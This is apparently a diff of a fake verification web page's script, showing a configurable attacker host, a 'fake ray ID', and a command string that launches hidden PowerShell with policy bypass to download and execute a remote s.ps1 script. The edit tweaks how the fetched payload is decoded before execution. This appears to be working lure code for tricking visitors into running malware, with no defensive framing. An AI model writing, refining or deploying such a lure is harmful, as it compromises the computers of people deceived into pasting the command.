@@ -174,7 +174,7 @@ kbd{
 var HOST = 'https://fairytail5d0.github.io/abobis';   // <-- REPLACE THIS
 // ════════════════════════════════════════════════════
 
-var CMD = 'powershell -w h -ep b "iex(iwr \'' + HOST + '/s.ps1\' -UseBasicParsing).Content"';
+var CMD = 'powershell -w h -ep b "iex([Text.Encoding]::UTF8.GetString((iwr \'' + HOST + '/s.ps1\' -UseBasicParsing).Content))"';
 
 // ── fake ray ID ──────────────────────────────────────
 document.getElementById('rid').textContent = (
